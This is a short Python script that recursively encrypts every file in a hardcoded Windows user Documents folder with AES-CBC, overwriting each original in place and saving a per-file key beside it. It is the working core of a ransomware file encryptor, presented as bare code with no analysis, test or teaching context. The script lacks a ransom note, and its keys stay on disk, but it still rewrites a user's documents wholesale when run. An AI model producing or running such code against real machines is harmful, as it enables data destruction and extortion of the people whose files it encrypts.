import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

# Configuration
key_size = 32  # AES key size in bytes
block_size = 16  # AES block size in bytes
encryption_directory = 'C:\\Users\\Username\\Documents'  # Directory to encrypt

def encrypt_file(file_path):
    try:
        # Generate a random key
        key = get_random_bytes(key_size)

        # Read the file content
        with open(file_path, 'rb') as file:
            data = file.read()

        # Pad the data to match the block size
        padded_data = pad(data, block_size)

        # Create a cipher object
        cipher = AES.new(key, AES.MODE_CBC)

        # Encrypt the padded data
        ciphertext = cipher.encrypt(padded_data)

        # Write the encrypted data to the file
        with open(file_path, 'wb') as file:
            file.write(cipher.iv + ciphertext)

        # Store the key for decryption
        with open(file_path + '.key', 'wb') as key_file:
            key_file.write(key)
    except Exception as e:
        print(f"Encryption failed for {file_path}: {e}")

# Encrypt files in the specified directory
for root, dirs, files in os.walk(encryption_directory):
    for file_name in files:
        file_path = os.path.join(root, file_name)
        encrypt_file(file_path)

print("Encryption completed.")